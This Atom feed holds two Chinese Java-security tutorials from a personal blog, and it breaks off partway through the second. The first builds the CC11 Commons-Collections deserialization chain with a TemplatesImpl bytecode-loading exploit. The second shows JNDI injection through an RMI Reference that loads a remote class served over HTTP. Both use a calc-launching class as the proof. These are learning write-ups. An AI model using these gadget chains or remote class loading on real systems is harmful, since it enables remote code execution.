<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>n4c1&#39;s Blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-07-23T07:28:44.426Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>n4c1</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>遗漏的CC11和CommonsBeanUtils链</title>
    <link href="http://example.com/2024/07/22/%E9%81%97%E6%BC%8F%E7%9A%84CC11%E5%92%8CCommonsBeanUtils%E9%93%BE/"/>
    <id>http://example.com/2024/07/22/%E9%81%97%E6%BC%8F%E7%9A%84CC11%E5%92%8CCommonsBeanUtils%E9%93%BE/</id>
    <published>2024-07-22T06:15:39.000Z</published>
    <updated>2024-07-23T07:28:44.426Z</updated>
    
    <content type="html"><![CDATA[<h1 id="遗漏的CC11和CommonsBeanUtils链"><a href="#遗漏的CC11和CommonsBeanUtils链" class="headerlink" title="遗漏的CC11和CommonsBeanUtils链"></a>遗漏的CC11和CommonsBeanUtils链</h1><p>之前我写了一篇专门分析cc链子的博客, 没有包含这位两条链子, 这里进行补充</p><h2 id="CC11"><a href="#CC11" class="headerlink" title="CC11"></a>CC11</h2><p>cc11对java版本没有限制, 我依然使用的是经典的jdk8u65</p><p>仍然是经典的cc依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>相信大家对这个版本已经是非常熟悉了, 这里就不多赘述了</p><p>cc11实际上是前面我们分析过的链子拼接来的, 它是利用的动态类加载</p><p>首先回忆一下, 在java核心库中, com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl这个类是可以进行任意类加载的, 我在cc3中首次分析了这个类的利用, 这里cc11也是利用了这个类并结合cc6的首部来触发</p><p>让我们再来分析一遍</p><p>首先找到com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl这个类, 他有一个defineClass方法</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240722230820146.png" alt="image-20240722230820146"></p><p>这个方法返回一个类, 也就是一个动态类加载</p><p>我们找谁调用了这个方法</p><p>很容易找到在同一个类下有一次调用</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240722230947998.png" alt="image-20240722230947998"></p><p>可这个defineTransletClasses依然是一个私有类型, 我们不能用cc6来调用这个方法, 所以继续寻找谁调用了defineTransletClasses方法</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240722231426843.png" alt="image-20240722231426843"></p><p>我们可以找到getTransletInstance这个类, 不过它依然是私有</p><p>继续寻找</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240722231657354.png" alt="image-20240722231657354"></p><p>这个newTransformer就是可以从外部访问的了</p><p>至此大概流程是这样的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240722232705864.png" alt="image-20240722232705864"></p><p>这里需要注意的几个点就是一些必要的赋值, 之前在CC3中也分析过了, 这里再简单看一遍</p><p>newTransformer到getTransletInstance没有什么判断</p><p>看getTransletInstance到defineTransletClasses</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240722231426843.png" alt="image-20240722231426843"></p><p>两个if判断, 要进入defineTransletClasses就需要_name不为null, _class为null</p><p>我们ctrl+鼠标左点到上面可以看见这两个属性的类型</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240723124531024.png" alt="image-20240723124531024"></p><p>按照要求反射赋值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="type">Field</span> <span class="variable">cls</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        cls.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        cls.set(templates, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p>接下来是defineTransletClasses到defineClass这一步</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240722230947998.png" alt="image-20240722230947998"></p><p>这里的_bytecodes就是我们要加载类的字节码</p><p>注意它的类型是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">byte</span>[][] _bytecodes = <span class="literal">null</span>;</span><br></pre></td></tr></table></figure><p>首先我们先编译一个恶意类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;CC11&quot;</span>);<span class="comment">//不会执行</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用javac编译后获取它的字节码并赋值给_bytecodes</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\tmp\\Evil.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, codes);</span><br></pre></td></tr></table></figure><p>至此这里似乎就已经通了, 我们先直接调用newTransformer()试试</p><p>发现会报错</p><p>定位到最后错误的这一行</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240723131418268.png" alt="image-20240723131418268"></p><p>打断点调试</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240723131511941.png" alt="image-20240723131511941"></p><p>发现这里_tfactory是空, 导致报错出错误了</p><p>我们去看这个_tfactory的定义</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> <span class="type">TransformerFactoryImpl</span> <span class="variable">_tfactory</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure><p>transient修饰使得_tfactory不被序列化进数据流, 所以即使现在我们反射给它赋值了, 序列化后它还是空值</p><p>我们不妨看看这个属性是否在其他地方进行了赋值</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240723132345064.png" alt="image-20240723132345064"></p><p>我们在该类的<code>readObject</code>方法中发现了一次赋值, 也就是说, 实际上我们根本不需要对他赋值, 反序列化后会自动给_tfactory赋值</p><p>这里我们先反射赋一个相同的值测试这一段链子是否流通</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>());</span><br></pre></td></tr></table></figure><p>再次测试, 发现还是报错</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240723133534887.png" alt="image-20240723133534887"></p><p>我们点击Creat breakpoint在抛出空指针错误的地方打断点</p><p>debug一下</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240723133820653.png" alt="image-20240723133820653"></p><p>发现这个if里面会判断恶意类的父类必须是<code>ABSTRACT_TRANSLET</code>,  不然会去else里导致抛出错误, 我们点进去看看这个ABSTRACT_TRANSLET</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240723134348495.png" alt="image-20240723134348495"></p><p>所以需要将恶意类继承com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</p><p>继承这个类需要实现对应的方法, 用idea自动帮我们实现就行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;CC11&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>再次测试, 就可以弹出计算器啦!!!</p><p>至此后半链子就完成了</p><p>贴一下exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC11</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, TransformerConfigurationException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\tmp\\Evil.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">cls</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        cls.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        cls.set(templates, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        templates.newTransformer();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接下来就是要拼接上CC6的前半链子</p><p>我们先看一下CC6这条链子是什么样的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330121419699.png" alt="image-20240330121419699"></p><p>我们只需要执行调用newTransformer()这一个方法, 因此用不到ChainedTransformer</p><p>所以大概流程就是这样</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240723142611703.png" alt="image-20240723142611703"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;遗漏的CC11和CommonsBeanUtils链&quot;&gt;&lt;a href=&quot;#遗漏的CC11和CommonsBeanUtils链&quot; class=&quot;headerlink&quot; title=&quot;遗漏的CC11和CommonsBeanUtils链&quot;&gt;&lt;/a&gt;遗漏的CC11和Com</summary>
      
    
    
    
    
    <category term="Java安全" scheme="http://example.com/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>JNDI注入初探</title>
    <link href="http://example.com/2024/07/12/JNDI%E6%B3%A8%E5%85%A5%E5%88%9D%E6%8E%A2/"/>
    <id>http://example.com/2024/07/12/JNDI%E6%B3%A8%E5%85%A5%E5%88%9D%E6%8E%A2/</id>
    <published>2024-07-12T14:07:13.000Z</published>
    <updated>2024-07-21T09:38:18.393Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JNDI注入初探"><a href="#JNDI注入初探" class="headerlink" title="JNDI注入初探"></a>JNDI注入初探</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://tttang.com/archive/1611/">https://tttang.com/archive/1611/</a></p><p><a href="https://xz.aliyun.com/t/12277">https://xz.aliyun.com/t/12277</a></p><p><a href="https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/">https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/</a></p><h2 id="JNDI-的利用方式"><a href="#JNDI-的利用方式" class="headerlink" title="JNDI 的利用方式"></a>JNDI 的利用方式</h2><h3 id="JNDI结合RMI"><a href="#JNDI结合RMI" class="headerlink" title="JNDI结合RMI"></a>JNDI结合RMI</h3><p>首先上服务端和客户端代码</p><p>Server:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.rmi.RMIServer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JndiRmiServer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteObjImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RemoteObj</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="title function_">RemoteObjImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">            <span class="built_in">super</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;hello, &quot;</span> + name;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> <span class="keyword">throws</span> NamingException, RemoteException &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">RemoteObj</span> <span class="variable">remoteObjImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjImpl</span>();</span><br><span class="line">        initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>, remoteObjImpl);</span><br><span class="line">        System.out.println(<span class="string">&quot;运行中...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException, RemoteException &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">JndiRmiServer</span>().start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Client:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JndiRmiClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException, RemoteException &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">RemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (RemoteObj) initialContext.lookup(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>);</span><br><span class="line">        System.out.println(remoteObj.sayHello(<span class="string">&quot;n4c1&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="RMI原生的漏洞"><a href="#RMI原生的漏洞" class="headerlink" title="RMI原生的漏洞"></a>RMI原生的漏洞</h4><p>首先跟一下调试, 证明JNDI的rmi服务实际上还是调用了原生的RMI</p><p>我们在客户端的这里打断点, 一直跟lookup方法(详细见参考链接)</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240712230751811.png" alt="image-20240712230751811"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240712230544299.png" alt="image-20240712230544299"></p><p>可以看见最后还是执行了我们熟悉的RegistryImpl_Stub类的lookup方法</p><p>因此rmi存在的漏洞这里也是适用的</p><h4 id="引用的漏洞，Normal-Jndi"><a href="#引用的漏洞，Normal-Jndi" class="headerlink" title="引用的漏洞，Normal Jndi"></a>引用的漏洞，Normal Jndi</h4><ul><li>这个漏洞被称作 Jndi 注入漏洞，它与所调用服务无关，不论你是 RMI，DNS，LDAP 或者是其他的，都会存在这个问题。</li></ul><p>这个漏洞与服务端调用了一个 <code>Reference</code> 对象有关</p><p>它类似于一个代理, 从外部url加载一个类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Calc&quot;</span>,<span class="string">&quot;Calc&quot;</span>,<span class="string">&quot;http://localhost:7777/&quot;</span>);</span><br><span class="line">        initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>, reference);</span><br></pre></td></tr></table></figure><p>我们先来看对应Reference的构造函数</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240713153750900.png" alt="image-20240713153750900"></p><p>后两个参数 factory, factoryLocation, 不禁让人联想到工厂模式这一设计理念, factoryLocation就是对象工厂的位置(我们的是http), factory为对象工厂名, 前面的className就是要实例化的类既然要实例化, 那它的构造函数就会被调用, 因此可以构造一个恶意类, 其构造函数中存放恶意代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JndiCalc</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">JndiCalc</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用javac将其编译为字节码(建议使用命令行来进行, 避免此字节码具有包结构, 注意使用和客户端服务端相同的java版本)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac JndiCalc.java</span><br></pre></td></tr></table></figure><p>然后使用python起一个http服务将其开放即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 7777</span><br></pre></td></tr></table></figure><p>之后运行客户端代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JndiRmiClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException, RemoteException &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">RemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (RemoteObj) initialContext.lookup(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>);</span><br><span class="line">        